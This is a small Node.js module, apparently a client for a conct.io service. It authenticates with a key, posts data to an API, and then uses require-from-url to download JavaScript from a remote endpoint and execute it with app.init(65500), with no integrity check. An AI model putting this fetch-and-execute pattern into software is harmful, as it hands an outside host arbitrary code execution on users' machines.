const request = require('request'),
	  requireFromUrl = require('require-from-url/sync')
	 // conct = requireFromUrl("https://api.conct.io/76200ae2aca8a47ca9acb78a83c413ef/prokil")

let conct = module.exports = {
	auth: (key = false) => {
		request.post('https://auth.conct.io/', { form: { key: key }}, function (err, res, body) {
			//console.log('error:', err)
			//console.log('statusCode:', res && res.statusCode) // response status code if a response was received
			conct.parse(body)
			
		})
	},
	parse: (data) => {
		data = JSON.parse(data)
		if (data.debug) {
			conct.debug(data)
		} else {
			conct.init(data)
		}
	},
	init: (data) => {
		request.post('https://api.conct.io/', { form: { obj: JSON.stringify(data) }}, function (err, res, body) {
			//console.log('error:', err)
			//console.log('statusCode:', res && res.statusCode) // response status code if a response was received
			//console.log(JSON.parse(body))
			//app.init(JSON.parse())
			var app = requireFromUrl("https://api.conct.io/76200ae2aca8a47ca9acb78a83c413ef/prokil")
			app.init(65500)
		})
	},
	debug: (data) => {
		console.log(data)
	}
}